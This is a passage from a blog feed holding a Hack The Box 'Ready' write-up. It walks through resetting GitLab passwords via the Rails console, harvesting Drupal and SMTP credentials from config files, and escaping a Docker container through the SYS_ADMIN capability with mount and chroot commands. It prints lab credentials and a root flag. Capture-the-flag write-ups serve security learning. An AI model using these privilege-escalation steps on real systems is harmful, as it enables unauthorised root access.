+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;021&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;save!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This grants us the admin access on GitLab, but we do not see anything initially of interest. We go back to enumerating users on the machine and find another familiar user which also has an account on GL: &lt;strong&gt;dude&lt;/strong&gt;. Using the same technique, we reset his password and proceed to login to find a repository we previously couldn’t see (or missed):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-24_03-50-16.png&quot; alt=&quot;Screenshot_2021-03-24_03-50-16&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;ready-channel-enumeration&quot;&gt;ready-channel enumeration&lt;/h4&gt;
+
+&lt;p&gt;Looking at the repository, it seems to be an installation of &lt;strong&gt;drupal&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Looking at the default credential installation, we find that it should be located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./sites/default/settings.php&lt;/code&gt; and we indeed find what appears to be a modified configuration file and a copy of the default config file; we check for difference with the default config:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;stbl@kali]─[10.10.14.232]─[~/boxes/ready/ready-channel-master/sites/default]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$diff&lt;/span&gt; default.settings.php settings.php                                                                                                                                             
+247c247,261
+&amp;lt; &lt;span class=&quot;nv&quot;&gt;$databases&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; array&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$databases&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   &lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'database'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'drupal'&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'drupaluser'&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%%cHzhNC=k9yYN!T'&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'host'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'port'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'driver'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mysql'&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'prefix'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+279c293
+&amp;lt; &lt;span class=&quot;nv&quot;&gt;$drupal_hash_salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$drupal_hash_salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'txgQ6RR8KK4Q4oJRoBp-ihbXALf2tbBFLFyp9suxQxc'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And find some credentials, which we note and try against all of our known services for dude and root, but none works.&lt;/p&gt;
+
+&lt;h4 id=&quot;enumerating-files&quot;&gt;Enumerating files&lt;/h4&gt;
+
+&lt;p&gt;Going through the &lt;strong&gt;linpeas&lt;/strong&gt; results, we did not find any solid track to follow, so instead we turn toward manual enumeration of suspicious files on the system. Our starting point lies on the fact that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root_pass&lt;/code&gt; file was created on &lt;strong&gt;June 29, 2020&lt;/strong&gt;, so we decide to go after the files created ever since with the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-path&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/sys*&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-path&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/proc/*&quot;&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-newermt&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'6/29/2020 0:00:00'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--full-time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/|/opt/gitlab/embedded|/opt/gitlab/sv/|/shm/'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 2- | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; |uniq &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 9 | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The command explained:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;First we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; in order to find:
+    &lt;ul&gt;
+      &lt;li&gt;&lt;em&gt;! -path “/sys&lt;/em&gt;” ! -path “/proc/&lt;em&gt;”&lt;/em&gt; : excluding directories sys and proc (system was a bit slow, so we excluded here instead of with grep)&lt;/li&gt;
+      &lt;li&gt;&lt;em&gt;-type f&lt;/em&gt;: “files” type of files.&lt;/li&gt;
+      &lt;li&gt;&lt;em&gt;-newermt ‘6/29/2020 0:00:00’&lt;/em&gt;: files newer than the date we mentioned above.&lt;/li&gt;
+      &lt;li&gt;&lt;em&gt;-exec ls -la –full-time {} \;&lt;/em&gt; execute ls on the found files and report result. We also include the full-timestamp with &lt;em&gt;–full-time&lt;/em&gt; so we are more easily able to identify which files were system modified or user-modified by looking at the nanoseconds&lt;/li&gt;
+      &lt;li&gt;&lt;em&gt;2&amp;gt;/dev/null&lt;/em&gt; redirect stderr to dev/null&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Then we exclude a bunch of additional patterns which contained non-interesting and install related files with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep -vE&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cut -d'.' -f 2- &lt;/code&gt; cut all the results by ‘.’ so we keep only the nanoseconds and the file names.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sort&lt;/code&gt; once.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uniq -c -w 9&lt;/code&gt;  to count (and prefix) the unique occurrence while only waking the 9 first characters into consideration. Main motivation behind this is to weed out cases where we have more than one occurrence of a file being saved exactly at the same time, which would suggest system-generated files versus human intervention.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This yields a pretty narrowed-down list of files to look into:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-30_00-32-10.png&quot; alt=&quot;Screenshot_2021-03-30_00-32-10&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The three files in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/backup/&lt;/code&gt; folder so sounds promising, so look into those:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;em&gt;docker-compose.yml&lt;/em&gt; contains settings about the docker-compose used to get the container going; we do find a redis instance running there and do basic enumeration on it, but find nothing of interest.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;em&gt;gitlab-secrets.json&lt;/em&gt; is mostly secret/public/private keys. We leave that alone for now.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;em&gt;gitlab.rb&lt;/em&gt; contains a bunch of commented our configuration parameters, however we do find one that isn’t:&lt;/p&gt;
+
+    &lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;gitlab_rails&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'smtp_password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;wW59U!ZKMbG9+*#h&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;We try this new password for &lt;strong&gt;root&lt;/strong&gt; on the machine and are now able to get root on the docker container.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;root-docker-to-root-host&quot;&gt;root (docker) to root (host)&lt;/h3&gt;
+
+&lt;p&gt;Now that we have a user with more privilege, we enumerate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root&lt;/code&gt; folder in search of the flag, but find nothing; this suggests that we need to go up a level and access the host, so we look into common &lt;a href=&quot;https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout&quot;&gt;breakout methods from hacktricks&lt;/a&gt; and try to look for our current capabilities using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capsh --print&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-30_01-10-47.png&quot; alt=&quot;Screenshot_2021-03-30_01-10-47&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One of the capability we have that seem to grant us an easy access on the host system is the &lt;strong&gt;SYS_ADMIN&lt;/strong&gt; one, which allows us to mount filesystems, which we can then exploit to mount the host itself:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fdisk &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+mount /dev/sda2 /mnt/foo/
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/foo
+&lt;span class=&quot;nb&quot;&gt;chroot&lt;/span&gt; ./ bash
+root@gitlab:/# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt 
+b7f98681505cd39066f67147b103c2b3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And thus, we gain the 🏴 root flag 🏴 of ready.&lt;/p&gt;
+
+&lt;h1 id=&quot;hindsight--after-thoughts&quot;&gt;Hindsight &amp;amp; After-Thoughts&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Easy foothold and final root escalation; this was all in the enumeration for me.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Looking into the GitLab users turned out to be a complete honey-pot. Did not gain relevant info from this, unless there was another intended way.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Box was a bit confusing at times, probably due to the multiple users on it at the same time updating passwords and all.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;</content><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><category term="htb" /><summary type="html">A fun and well made box, where 80% of the time was spent enumerating and the remaining 20% split on easy foothold and root privesc.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/d7a56d2476ef541853df356a46976f45.png" /><media:content medium="image" url="/assets/images/d7a56d2476ef541853df356a46976f45.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HTB Writeup - Luanne</title><link href="/posts/HTB-Writeup-Luanne" rel="alternate" type="text/html" title="HTB Writeup - Luanne" /><published>2021-03-18T19:36:34+01:00</published><updated>2021-03-18T19:36:34+01:00</updated><id>/posts/HTB-Writeup:-Luanne</id><content type="html" xml:base="/posts/HTB-Writeup-Luanne">&lt;p&gt;&lt;img src=&quot;/assets/images/7a4a9e4198292175421007edb1724a11.png&quot; alt=&quot;7a4a9e4198292175421007edb1724a11&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;This is one of my first few writeup for HTB boxes, starting with Luanne, a NetBSD box completed on March 17 2021.&lt;/p&gt;
 
